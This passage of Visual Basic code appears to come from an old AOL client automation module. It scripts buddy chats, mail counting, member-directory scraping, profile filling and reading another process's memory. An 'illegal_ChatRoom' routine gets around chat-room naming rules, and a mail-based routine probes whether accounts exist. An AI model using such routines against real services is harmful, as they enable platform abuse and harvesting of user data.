
End Sub



Function Aol_Version() As String
Dim GMenu As Long, cnt As Integer, aol As Long, _
SubCnt As Integer, MM As Integer, SM As Integer, _
Buffa As String, MenuItemCnt As Integer, ToSearchSub As Long
Dim Aol5 As Boolean
Aol5 = False

aol& = FindWindow("AOL Frame25", vbNullString)
GMenu& = GetMenu(aol&)
cnt = GetMenuItemCount(GMenu&)

For MM = 0 To cnt - 1
ToSearchSub& = GetSubMenu(GMenu&, MM)
MenuItemCnt = GetMenuItemCount(ToSearchSub&)

For SM = 0 To MenuItemCnt - 1
SubCnt = GetMenuItemID(ToSearchSub&, SM)
Buffa$ = String$(100, " ")
Call GetMenuString(ToSearchSub&, SubCnt, Buffa$, 100, 1)

If InStr(LCase(Buffa$), "&what's new in aol 5.0") Then
Aol5 = True
End If

Next SM
Next MM

Aol_Version = IIf(Aol5 = True, "5", "4")

End Function



Function BinaryToDecimal(txtB As Integer) As Integer
On Local Error Resume Next

Dim i As Integer, n As Integer, a As Integer
Dim Num As String

Num = txtB

If IsNumeric(Num) = False Then Exit Function
'101 = 5
For i = 1 To Len(Num)
n = Mid(Num, i, 1)
    If Not (n = 0) Then
        n = (n * 2) ^ (Len(Num) - i)
    Else
        n = 0
    End If

a = a + n
Next i
BinaryToDecimal = Int(a)
    If Err Then
        BinaryToDecimal = "error"
    End If
End Function

Function BinaryToHex(txtB As Integer)
On Local Error Resume Next
Dim BinN As Integer
BinN = BinaryToDecimal(txtB)
BinaryToHex = Hex(BinN)
    If Err Then
        BinaryToHex = "error"
    End If

End Function


Sub BuddyChat(Names As String, Messg As String, ChatName As String)
Dim aol As Long, mdi As Long, chil As Long, _
titl As Long, icona As Long, titl2 As Long, _
IconB As Long, Edi1 As Long

Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
titl& = FindChildByTitle(mdi&, chil&, "Buddy List Window")
icona& = FindWindowEx(titl&, 0&, "_AOL_Icon", vbNullString)
    If titl& = 0 Then
    Call RunAOLMenu(10, 8)
    Wait (0.3)
    End If
Loop Until titl& <> 0 And icona& <> 0

Dim il As Integer
    For il = 1 To 6
        icona& = GetWindow(icona&, GW_HWNDNEXT)
    Next il
        Call ClickButton(icona&)
Do: DoEvents
    titl2& = FindChildByTitle(mdi&, chil&, "Buddy Chat")
    Edi1& = FindWindowEx(titl2&, 0&, "_AOL_Edit", vbNullString)
    IconB& = FindWindowEx(titl2&, 0&, "_AOL_Icon", vbNullString)
Loop Until titl2& <> 0 And Edi1& <> 0 And IconB& <> 0

Call SendMessageByString(Edi1&, WM_SETTEXT, 0&, Names)
    Edi1& = GetWindow(Edi1&, GW_HWNDNEXT)
Call SendMessageByString(Edi1&, WM_SETTEXT, 0&, Messg)
    For il = 1 To 5
        Edi1& = GetWindow(Edi1&, GW_HWNDNEXT)
    Next il
Call SendMessageByString(Edi1&, WM_SETTEXT, 0&, ChatName)
    Edi1& = GetWindow(Edi1&, GW_HWNDPREV)
        Edi1& = GetWindow(Edi1&, GW_HWNDPREV)
Call SendMessageByString(Edi1&, WM_SETTEXT, 0&, "Reminder:AOL Staff Sux")
Call ClickButton(IconB&)

End Sub

Sub BuddyListSet(Lis As ListBox)
Dim aol As Long, mdi As Long, Tit As Long, LisB As Long, _
Cat As String, tlen As Long, CatNum As Integer, CNum As Integer, _
icona As Long, IconB As Long, Tit2 As Long, _
cn As Integer, Lis1 As Long, i As Integer, chil As Long
Dim ctitl As String, X As Integer, Chld As Long
cn = 0
    If Lis.ListCount = 0 Then
        Exit Sub
    End If

Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Buddy List Window")
Lis1& = FindWindowEx(Tit&, 0&, "_AOL_Listbox", vbNullString)
    If Tit& = 0 Then            'makes sure Buddy List Window
        Call RunAOLMenu(10, 8)  'is up
        Wait (0.3)
    End If
If Tit& <> 0 And Lis1& <> 0 Then Exit Do
Loop
Call ReadProcess2Array(Lis1&) 'read buddy list items

                For i = 0 To SizeOfPA 'loop through items
                   If InStr(ProcessArray(i), "(") And InStr(ProcessArray(i), "/") <> 0 Then
                   cn = Val(cn) + 1 'increment if group is found
                   End If
                Next i

    icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
    icona& = GetWindow(icona&, GW_HWNDNEXT)
    icona& = GetWindow(icona&, GW_HWNDNEXT)
    icona& = GetWindow(icona&, GW_HWNDNEXT)
    icona& = GetWindow(icona&, GW_HWNDNEXT)

    Call ClickButton(icona&)
Dim BListB As Long, LNum As Integer, ModS As Long, mIcon As Long
Do: DoEvents
Tit2& = FindChildByTitle(mdi&, chil&, "'s buddy list")
IconB& = FindWindowEx(Tit2&, 0&, "_AOL_Icon", vbNullString)
BListB& = FindWindowEx(Tit2&, 0&, "_AOL_Listbox", vbNullString)
If Tit2& <> 0 And IconB& <> 0 And BListB& <> 0 Then Exit Do
Loop

    IconB& = GetWindow(IconB&, GW_HWNDNEXT)
    IconB& = GetWindow(IconB&, GW_HWNDNEXT) 'delete button

While cn > 0
        Call ClickButton(IconB&) 'click delete
        Call Modal_StaticWait("Delete ") 'wait for delete window

        Do: DoEvents
            LNum = SendMessage(BListB&, LB_GETCOUNT, 0, 0&)
                If LNum = (cn - 1) Then
                    cn = cn - 1
                    Wait (0.2)
                    Exit Do
                End If
        Loop
Wend
DoEvents
    IconB& = GetWindow(IconB&, GW_HWNDPREV)
    IconB& = GetWindow(IconB&, GW_HWNDPREV)
    Call ClickButton(IconB&)
Dim Ctit As Long, Cedit As Long, IconC As Long, Clist As Long
'''START OF LOOP'''''''''''''''''''''''''''''''''''''''''''''
Dim gly As Long, DL As Integer, GName As String, DEdit As Long, _
Conf As Long, SavButn As Long, AddButn As Long, cntr As Variant, _
Lcount As Integer

For DL = 0 To Lis.ListCount - 1
Lis.Selected(DL) = True
    If Not (Mid(Lis.List(DL), 1, 1) = "_") Then
        MsgBox ("Invalid list format."), vbCritical, ("Error")
        Exit Sub
    End If
cntr = 0
Do: DoEvents
cntr = Val(cntr) + 0.5
    Ctit& = FindChildByTitle(mdi&, chil&, "create a buddy")
    Cedit& = FindWindowEx(Ctit&, 0&, "_AOL_Edit", vbNullString)
    IconC& = FindWindowEx(Ctit&, 0&, "_AOL_Icon", vbNullString)
    Clist& = FindWindowEx(Ctit&, 0&, "_AOL_Listbox", vbNullString)
    gly& = FindWindowEx(Ctit&, 0&, "_AOL_Glyph", vbNullString)
    If cntr = 1.5 Then
        Call ClickButton(IconB&)
        cntr = 0
    End If

Loop Until Ctit& <> 0 And Cedit& <> 0 And IconC& <> 0 And gly& <> 0
''''''''''CREATE GROUP WINDOW UP
DEdit& = Cedit&
    DEdit& = GetWindow(DEdit&, GW_HWNDNEXT)
    DEdit& = GetWindow(DEdit&, GW_HWNDNEXT)
    DEdit& = GetWindow(DEdit&, GW_HWNDNEXT)
    AddButn& = GetWindow(DEdit&, GW_HWNDNEXT)
gly& = FindWindowEx(Ctit&, gly&, "_AOL_Glyph", vbNullString)
SavButn& = GetWindow(gly&, GW_HWNDNEXT)
    GName$ = Mid(Lis.List(DL), 3, Len(Lis.List(DL)))
    Call SendMessageByString(Cedit&, WM_SETTEXT, 0, GName$) 'set group name to edit box
'''''''''ITEM LOOP
If DL = Lis.ListCount - 1 Then
    Exit For
End If
    If Not (Mid(Lis.List(DL + 1), 1, 1) = "_") Then
        Do: DoEvents
            If DL = Lis.ListCount - 1 Then
                Exit For
            End If
            DL = DL + 1
            Lis.Selected(DL) = True
            Lcount = SendMessage(Clist&, LB_GETCOUNT, 0, 0&)
            Call SendMessageByString(DEdit&, WM_SETTEXT, 0, Lis.List(DL))
            Call ClickButton(AddButn&)
cntr = 0
Dim txtL As Integer
                Do: DoEvents
                cntr = cntr + 0.5
                    tlen = SendMessage(Clist&, LB_GETCOUNT, 0, 0&)
                    txtL = SendMessageByNum(DEdit&, 14, 0, 0&)
                        If cntr = 1.5 And txtL = 0 Then
                            Call SendMessageByString(DEdit&, WM_SETTEXT, 0, Lis.List(DL))
                            Call ClickButton(AddButn&)
                            cntr = 0
                        ElseIf cntr = 1.5 And txtL > 0 Then
                            Call ClickButton(AddButn&)
                            cntr = 0
                        End If
                        Wait (0.3)
                Loop Until tlen = Lcount + 1 'wait for aol to add name
            Wait (0.3)
            If Mid(Lis.List(DL + 1), 1, 1) = "_" Then 'if next item is a group name
                Exit Do
            End If
        Loop
    End If 'If statement above this loop

    'click save - wait for confirmation - open create group - start over
    Call ClickButton(SavButn&)
        Do: DoEvents
            Conf& = FindWindow("#32770", vbNullString)
            If Conf& <> 0 Then
                Call SendMessage(Conf&, WM_CLOSE, 0, 0&)
                Exit Do
            End If
        Loop
        Wait (0.4) 'pacer
        Call ClickButton(IconB&) 'open window again
Next DL


                Call SendMessageByString(DEdit&, WM_SETTEXT, 0, Lis.List(DL))
                Call ClickButton(AddButn&)
                Do: DoEvents
                    tlen = GetWindowTextLength(DEdit&)
                Loop Until tlen = 0 'wait for aol to add name
            Wait (0.4)              'make sure
Call ClickButton(SavButn&)
        Do: DoEvents
            Conf& = FindWindow("#32770", vbNullString)
            If Conf& <> 0 Then
                Call SendMessage(Conf&, WM_CLOSE, 0, 0&)
                Exit Do
            End If
        Loop
        Wait (0.3)
Call SendMessage(Ctit&, WM_CLOSE, 0, 0&)
Call SendMessage(Tit2&, WM_CLOSE, 0, 0&)
End Sub

Sub ChangeRoomTitle(CTo As String)
Dim room As Long
room& = FindChat
Call SendMessageByString(room&, WM_SETTEXT, 0, CTo)

End Sub

Function CheckIfAlive(AName As String) As Boolean
Dim ErrWin As Long, icona As Long
Dim mdi As Long, chil As Long, _
aol As Long, AView As Long, tlen As Long, _
Buffa As String, Alive As Boolean
Dim MWin As Long
Call SendMail("#Hound2000," & AName, "u dead or what?", "u dead or what?")

Do: DoEvents
aol& = FindWindow("Aol Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
ErrWin& = FindChildByTitle(mdi&, chil&, "error")
icona& = FindWindowEx(ErrWin&, 0&, "_AOL_Icon", vbNullString)
AView& = FindWindowEx(ErrWin&, 0&, "_AOL_View", vbNullString)
MWin& = FindChildByTitle(mdi&, chil&, "Write Mail")
If ErrWin& <> 0 And icona& <> 0 And AView& <> 0 And MWin& <> 0 Then Exit Do
Loop
tlen = SendMessageByNum(AView&, 14, 0, 0&)
Buffa$ = Space$(tlen)
Call SendMessageByString(AView&, 13, tlen + 1, Buffa$)
    If InStr(LCase(Buffa$), LCase(TrimSpaces(AName))) <> 0 Then
        Alive = False
    Else
        Alive = True
    End If
Call PostMessage(ErrWin&, WM_CLOSE, 0&, 0&)

Call PostMessage(MWin&, WM_CLOSE, 0&, 0&)
DoEvents
Dim BWin As Long, BWinB As Long
Do: DoEvents
        BWin& = FindWindow("#32770", "America Online")
        BWinB& = FindWindowEx(BWin&, 0&, "Button", "&No")
    If BWin& <> 0 And BWinB& <> 0 Then
        Call ClickButton(BWinB&)
        Exit Do
    End If
  Wait (0.2)
Loop
CheckIfAlive = Alive

End Function

Function DownloadStat_File() As String
Dim Mstat As Long, MTitl As Long
Dim File As String, Buffa As String, Snum As Integer
Dim aol As Long, mdi As Long, chil As Long
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
MTitl& = FindChildByTitle(mdi&, chil&, "file transfer")
Mstat& = FindWindowEx(MTitl&, 0&, "_AOL_Static", vbNullString)

Snum = SendMessageByNum(Mstat&, 14, 0&, 0&)
Buffa$ = Space$(Snum)
Call SendMessageByString(Mstat&, 13, Snum + 1, Buffa$)
DownloadStat_File = (Mid(Buffa$, 17, Len(Buffa$)))

End Function

Function DownloadStat_Percent() As Integer
Dim Mstat As Long, MTitl As Long
Dim File As String, Buffa As String, Snum As Integer
Dim aol As Long, mdi As Long, chil As Long
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
MTitl& = FindChildByTitle(mdi&, chil&, "file transfer")

Snum = GetWindowTextLength(MTitl&)
Buffa$ = Space$(Snum)
Call GetWindowText(MTitl&, Buffa$, Snum + 1)
DownloadStat_Percent = (Mid(Buffa$, 17, InStr(Buffa$, "%") - 17))

End Function

Public Function DriveType(Drv As String) As String
'Msgbox(DriveType("a:\")  or use "a:","c:",
'or "c:\" etc etc
Dim DType As Integer, SDType As String

DType = GetDriveType(Drv)
Select Case DType
    Case 2:
        SDType = "DRIVE_REMOVABLE"
    Case 3:
        SDType = "DRIVE_FIXED"
    Case 4:
        SDType = "DRIVE_REMOTE"
    Case 5:
        SDType = "DRIVE_CDROM"
    Case 6:
        SDType = "DRIVE_RAMDISK"
    Case Else
        SDType = "Unknown Type"
End Select
DriveType = SDType

End Function

Function FindChildByTitle(hWnd1 As Long, hWnd2 As Long, LookF As String)
'Feel free to use this, it saves alot of time
'so you dont have to keep looping in every sub
Dim WTLen As Integer, WTBuf As String, WTitle As Long, CName As String
Dim CBuff As String, Hwd1 As Long, Hwd2 As Long, ParWin As Long
Hwd1& = hWnd1
Hwd2& = hWnd2
    CBuff$ = String(250, 0)
    CName$ = GetClassName(Hwd2&, CBuff$, 250)
    CBuff$ = RTrim(LTrim(CBuff$))
    
Hwd2& = FindWindowEx(Hwd1&, 0&, CBuff$, vbNullString)

WTLen% = GetWindowTextLength(Hwd2&)
WTBuf$ = String$(200, 0)
WTitle& = GetWindowText(Hwd2&, WTBuf$, (WTLen% + 1))
If InStr(LCase(WTBuf$), LCase(LookF$)) <> 0 Then
        FindChildByTitle = Hwd2&
        Exit Function
Else

    Do While Hwd2& > 0: DoEvents
        Hwd2& = FindWindowEx(Hwd1&, Hwd2&, CBuff$, vbNullString)
        WTLen% = GetWindowTextLength(Hwd2&)
        WTBuf$ = String$(200, 0)
        WTitle& = GetWindowText(Hwd2&, WTBuf$, (WTLen% + 1))
            If InStr(LCase(WTBuf$), LCase(LookF$)) <> 0 Then
                Exit Do
            End If
    Loop
 FindChildByTitle = Hwd2&
End If

End Function

Sub Form_Center(Frm As Form)
With Frm
    .Top = (Screen.Height - .Height) / 2
    .Left = (Screen.Width - .Width) / 2
End With

End Sub

Sub Form_NotOnTop(Frm As Form)
Call SetWindowPos(Frm.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, FLAGS)

End Sub

Sub GetProfile2List(Nam As String, Questn As ListBox, Answr As ListBox)
Dim profil As String, l As String
profil$ = GetProfile(Nam)
Dim i As Integer, Lne As String
    For i = 1 To Len(profil$)
        l$ = Mid(profil$, i, 1)
        If l$ = Chr(13) Then
            Questn.AddItem Mid(Lne$, 1, InStr(Lne$, ":"))
            Answr.AddItem (Mid(Lne$, InStr(Lne$, ":") + 1, Len(Lne$)))
            Lne$ = ""
        Else
            Lne$ = Lne$ & l$
        End If
    Next i
i = 0
For i = 0 To Answr.ListCount - 1
    If Mid(Answr.List(i), 1, 1) = Chr(9) Then
        Answr.List(i) = Mid(Answr.List(i), 2, Len(Answr.List(i)))
    End If

    Next i
    
End Sub

Sub illegal_ChatRoom(CName As String)

Dim l As String, c As Integer, iName As String
For c = 1 To (Len(CName) - 1)
    iName = iName & Mid(CName, c, 1) & "%A0"
Next c
iName = iName & Right(CName, 1)
Call Keyword("aol://2719:2-2-" & iName)
DoEvents
Call ClearKeyWord

End Sub

Function Mail_CountNew()
Call Mail_OpenNew
Dim aol As Long, mdi As Long, Tit As Long, chil As Long, _
tab1 As Long, tab2 As Long, tree As Long, c As Integer
Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, " Online Mailbox")
tab1& = FindWindowEx(Tit&, 0&, "_AOL_TabControl", vbNullString)
tab2& = FindWindowEx(tab1&, 0&, "_AOL_TabPage", vbNullString)
tree& = FindWindowEx(tab2&, 0&, "_AOL_Tree", vbNullString)
Loop Until tree& <> 0

Dim LoadAll As Integer
Wait (0.5)
   Do: DoEvents
        c = SendMessage(tree&, LB_GETCOUNT, 0, 0&)
    If LoadAll = c Then
            Exit Do
    Else
            LoadAll = c
            Wait (0.3)
    End If
    Loop
Mail_CountNew = c
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)

End Function
Function Mail_CountSent()
Call Mail_OpenSent
Wait (1)
Dim aol As Long, mdi As Long, Tit As Long, chil As Long, _
tab1 As Long, tab2 As Long, tree As Long, c As Integer
Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, " Online Mailbox")
tab1& = FindWindowEx(Tit&, 0&, "_AOL_TabControl", vbNullString)
tab2& = FindWindowEx(tab1&, 0&, "_AOL_TabPage", vbNullString)
tab2& = GetWindow(tab2&, GW_HWNDNEXT)
tab2& = GetWindow(tab2&, GW_HWNDNEXT)
tree& = FindWindowEx(tab2&, 0&, "_AOL_Tree", vbNullString)
Loop Until tree& <> 0
Dim LoadAll As Integer
Wait (0.3)
   Do: DoEvents
        c = SendMessage(tree&, LB_GETCOUNT, 0, 0&)
    If LoadAll = c Then
            Exit Do
    Else
            LoadAll = c
            Wait (0.3)
    End If
    Loop
Mail_CountSent = c
Call SendMessage(Tit&, WM_CLOSE, 0, 0&)
End Function



Sub MemberSearch_Quick(LisB As ListBox, SStrin As String)
Dim aol As Long, mdi As Long, chil As Long, t As Integer, _
titl As Long, Edi As Long, Chx As Long, Butn As Long
Dim titl2 As Long, IconC As Long, BWin As Long, _
Lcount As Integer, Lcount2 As Integer, nGood As Boolean
Dim Lis As Long, Nam As String, cntr As Integer

cntr = 0
Call RunAOLMenu(10, 4)
Wait (0.5)
Do: DoEvents
    aol& = FindWindow("AOL Frame25", vbNullString)
    mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
    chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
    titl& = FindChildByTitle(mdi&, chil&, "Member Directory")
    Edi& = FindWindowEx(titl&, 0&, "_AOL_Edit", vbNullString)
Loop Until titl& <> 0 And Edi& <> 0
DoEvents
    Edi& = GetWindow(Edi&, GW_HWNDNEXT)
        Edi& = GetWindow(Edi&, GW_HWNDNEXT)
    Edi& = GetWindow(Edi&, GW_HWNDNEXT)
Butn& = Edi&
        For t = 1 To 27
            DoEvents
            Butn& = GetWindow(Butn&, GW_HWNDNEXT)
        Next t
    Chx& = Butn&
    Chx& = GetWindow(Chx&, GW_HWNDNEXT)
    Chx& = GetWindow(Chx&, GW_HWNDNEXT)
    Chx& = GetWindow(Chx&, GW_HWNDNEXT)
    Wait (0.3)
    Call ClickButton(Chx&)
    DoEvents
    Call SendMessageByString(Edi&, WM_SETTEXT, 0, SStrin)
    Call ClickButton(Butn&)
    Wait (1)
    Do: DoEvents
    cntr = cntr + 1
        titl2& = FindChildByTitle(mdi&, chil&, "Search Results")
        Lis& = FindWindowEx(titl2&, 0&, "_AOL_Listbox", vbNullString)
        IconC& = FindWindowEx(titl2&, 0&, "_AOL_Icon", vbNullString)
        BWin& = FindWindow("#32770", vbNullString)
        If BWin& <> 0 Then 'internal aol error or no matches
            Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
            Call SendMessage(titl&, WM_CLOSE, 0, 0&)
            Exit Sub
        End If
    Wait (0.5)
    If cntr = 16 Then
        cntr = 0
        Call ClickButton(Butn&)
    End If
    Loop Until IconC& <> 0 And Lis& <> 0
                            BWin& = FindWindow("#32770", vbNullString)
                    If BWin& <> 0 Then
                        Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
                    End If
''''''ALL ITEMS UP
        Call ReadProcess2Array(Lis&)
         DoEvents
            Call SendMessage(titl&, WM_CLOSE, 0, 0&)
            Call SendMessage(titl2&, WM_CLOSE, 0, 0&)
                BWin& = FindWindow("#32770", vbNullString)
                If BWin& <> 0 Then 'make sure
                    Call SendMessage(BWin&, WM_CLOSE, 0, 0&)
                End If

            For t = 0 To SizeOfPA
            Nam = Mid(ProcessArray(t), 2, (InStr(2, ProcessArray(t), vbTab) - 1))
                If InStr(LCase(Nam), LCase(SStrin)) <> 0 Then
                    LisB.AddItem Nam
                End If
            Next t

End Sub

Public Function Memory_FreeRam() As Single
Dim LPb As MEMORYSTATUS
Call GlobalMemoryStatus(LPb)
Dim FMem As Single
FMem = (LPb.dwAvailPhys / 1024) / 1024
Memory_FreeRam = Format(FMem, "0.00")
End Function
Public Function Memory_TotalRam() As Single
Dim LPb As MEMORYSTATUS
Call GlobalMemoryStatus(LPb)
Dim TMem As Single
TMem = (LPb.dwTotalPhys / 1024) / 1024
Memory_TotalRam = Format(TMem, "0.00")
End Function
Function Online_Clock() As String
Dim ModWin As Long, Stat As Long, Buffr As String, _
Blen As Long, Tim As String, IconW As Long
    If Aol_Version = "4" Then
        Call RunAOLMenu(6, 6)
    Else
        Call RunAOLMenu(6, 7)
    End If

Do: DoEvents
    ModWin& = FindWindow("_AOL_Modal", vbNullString)
    Stat& = FindWindowEx(ModWin&, 0&, "_AOL_Static", vbNullString)
    IconW& = FindWindowEx(ModWin&, 0&, "_AOL_Icon", vbNullString)
Loop Until ModWin& <> 0 And Stat& <> 0 & IconW& <> 0

Blen& = SendMessageByNum(Stat&, 14, 0&, 0&)
Buffr$ = Space$(Blen&)
Call SendMessageByString(Stat&, 13, Blen + 1, Buffr$)
Tim$ = Mid(Buffr$, InStr(LCase(Buffr$), "online for") + 11, Len(Buffr$) - 1)
Tim$ = Mid(Tim$, 1, Len(Tim$) - 1)
Call ClickButton(IconW&)
Online_Clock = Tim$


End Function

Sub PlayWavEndLoop()
Call sndPlaySound(vbNullString, SND_ASYNC)

End Sub

Sub Profile_FillOut(PName As String, PLocal As String, _
PSex As String, PMarital As String, PHobby As String, _
PCompUsed As String, POccupation As String, PQuote As String)
'''''''''''''''''''''''
'The sex option is filled by puting a M, F, or N
'M = Male (duh), F = FEMALE (hmm really) and N = NO RESPONSE (no shit!)
'Ex: Call Profile_FillOut("Chris","NY baby!","M","Neva!","VB","My Comp","Ceo Microsoft","blah blah")

Dim ALook As Integer, ProfWin As Long, PEdi As Long, PCheck As Long
Dim RemWin As Long, RemIcon As Long, RemCheck As Long, _
PModstat As String, aol As Long, mdi As Long, chil As Long
    '''TRIM ANSWERS
    If Len(PName$) > 128 Then
        PName$ = Mid(PName$, 1, 128)
    End If
    If Len(PLocal$) > 255 Then
        PLocal$ = Mid(PLocal$, 1, 255)
    End If
    If Len(PMarital$) > 32 Then
        PMarital$ = Mid(PMarital$, 1, 32)
    End If
    If Len(PHobby$) > 255 Then
        PHobby$ = Mid(PHobby$, 1, 255)
    End If
    If Len(PCompUsed$) > 128 Then
        PCompUsed$ = Mid(PCompUsed$, 1, 128)
    End If
    If Len(POccupation$) > 128 Then
        POccupation$ = Mid(POccupation, 1, 128)
    End If
    If Len(PQuote$) > 255 Then
        PQuote$ = Mid(PQuote$, 1, 255)
    End If
    
    '''''''''''''''
Call RunAOLMenu(6, 13)
ALook = 0
Do: DoEvents
    PModstat$ = Modal_Static
    If InStr(LCase(PModstat$), "remember") <> 0 Then
        RemWin& = FindWindow("_AOL_Modal", vbNullString)
        RemCheck& = FindWindowEx(RemWin&, 0&, "_AOL_Checkbox", vbNullString)
        RemIcon& = FindWindowEx(RemWin&, 0&, "_AOL_Icon", vbNullString)
        Call PostMessage(RemCheck&, BM_SETCHECK, True, 0&)
        Call ClickButton(RemIcon&)
    End If
ALook = Val(ALook) + 1
Wait (0.5)
Loop Until ALook >= 4
''''''''''''''''''''''''''''
Do: DoEvents
    aol& = FindWindow("AOL Frame25", vbNullString)
    mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
    chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
    ProfWin& = FindChildByTitle(mdi&, chil&, "Edit Your Online Profile")
    PEdi& = FindWindowEx(ProfWin&, 0&, "_AOL_Edit", vbNullString)
    PCheck& = FindWindowEx(ProfWin&, 0&, "_AOL_Checkbox", vbNullString)
Loop Until ProfWin& <> 0 And PEdi& <> 0 And PCheck& <> 0

Call SendMessageByString(PEdi&, WM_SETTEXT, 0, PName$)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
Call SendMessageByString(PEdi&, WM_SETTEXT, 0, PLocal$)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
Call SendMessageByString(PEdi&, WM_SETTEXT, 0, PMarital$)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
Call SendMessageByString(PEdi&, WM_SETTEXT, 0, PHobby$)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
Call SendMessageByString(PEdi&, WM_SETTEXT, 0, PCompUsed$)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
Call SendMessageByString(PEdi&, WM_SETTEXT, 0, POccupation$)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
Call SendMessageByString(PEdi&, WM_SETTEXT, 0, PQuote$)
    Select Case LCase(PSex)
        Case "m"
            Call SendMessage(PCheck&, BM_SETCHECK, True, 0&)
        Case "f"
            PCheck& = GetWindow(PCheck&, GW_HWNDNEXT)
            Call SendMessage(PCheck&, BM_SETCHECK, True, 0&)
        Case "n"
            PCheck& = GetWindow(PCheck&, GW_HWNDNEXT)
            PCheck& = GetWindow(PCheck&, GW_HWNDNEXT)
            Call SendMessage(PCheck&, BM_SETCHECK, True, 0&)
     End Select
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)
    PEdi& = GetWindow(PEdi&, GW_HWNDNEXT)

Call ClickButton(PEdi&)
Dim YeaYea As Long
Do: DoEvents
YeaYea& = FindWindow("#32770", vbNullString)
Loop Until YeaYea& <> 0
Call SendMessage(YeaYea&, WM_CLOSE, 0, 0&)

End Sub

Private Sub ReadProcess2Array(LHwnd As Long)
On Error Resume Next
'Array is read into variable ProcessArray
'SizeOfPA = array size (0-#)
Dim AProc As Long, holdit As Long, Person As String
Dim HoldThem As Long, Howmnybts As Long, AolThread As Long
Dim i As Integer, LNum As Integer, NoErr As Integer, ProcThread As Long
ProcessNoGo = False
SizeOfPA = 0
AolThread = GetWindowThreadProcessId(LHwnd&, AProc)
ProcThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AProc)

If ProcThread Then
LNum = SendMessage(LHwnd&, LB_GETCOUNT, 0, 0) - 1
ReDim ProcessArray(LNum)
SizeOfPA = LNum

For i = 0 To (LNum)
Person$ = String$(4, vbNullChar)
holdit = SendMessage(LHwnd&, LB_GETITEMDATA, ByVal CLng(i), ByVal 0&)
holdit = holdit + 24
Call ReadProcessMemory(ProcThread, holdit, Person$, 4, Howmnybts)

Call RtlMoveMemory(HoldThem, ByVal Person$, 4)
HoldThem = HoldThem + 6

Person$ = String$(50, vbNullChar)
Call ReadProcessMemory(ProcThread, HoldThem, Person$, Len(Person$), Howmnybts)
NoErr = InStr(Person$, vbNullChar)
    If NoErr > 0 Then
        Person$ = Left(Person$, (NoErr) - 1)
    End If

ProcessArray(i) = Person$

Next i
Call CloseHandle(ProcThread)
Else
 ProcessNoGo = True
End If

End Sub

Sub RunAOLMenu(IconNum As Integer, UpNum As Integer)
Dim aol As Long, tool As Long, ToolB As Long, _
icona As Long, i As Integer
Dim cPos As POINTAPI

aol& = FindWindow("AOL Frame25", vbNullString)
tool& = FindWindowEx(aol&, 0&, "AOL Toolbar", vbNullString)
ToolB& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
icona& = FindWindowEx(ToolB&, 0&, "_AOL_Icon", vbNullString)
    For i = 1 To (IconNum - 1)
        icona& = GetWindow(icona&, GW_HWNDNEXT)
    Next i

Call GetCursorPos(cPos)
DoEvents
Call SetCursorPos(1, 1)

Call PostMessage(icona&, WM_LBUTTONDOWN, 0, 0&)
Call PostMessage(icona&, WM_LBUTTONUP, 0, 0&)
Dim MenuWin As Long, MenuVis As Long, IcN As Integer
    Do: DoEvents
        MenuWin& = FindWindow("#32768", vbNullString)
        MenuVis& = IsWindowVisible(MenuWin&)
    Loop Until MenuVis& <> 0

'Call SetFocusAPI(MenuWin&)
For IcN = 1 To UpNum
Call PostMessage(MenuWin&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(MenuWin&, WM_KEYUP, VK_UP, 0&)
Next IcN

Call PostMessage(MenuWin&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(MenuWin&, WM_KEYUP, VK_RETURN, 0&)
DoEvents
Call SetCursorPos(cPos.X, cPos.Y)

End Sub

Sub SignOnAsGuest(GName As String, GPass As String)
Dim aol As Long, mdi As Long, chil As Long, Tit1 As Long, _
Tit2 As Long, Tit As Long, Combo As Long, Edi As Long
Dim Modal As Long, Stat As Long, IconB As Long, _
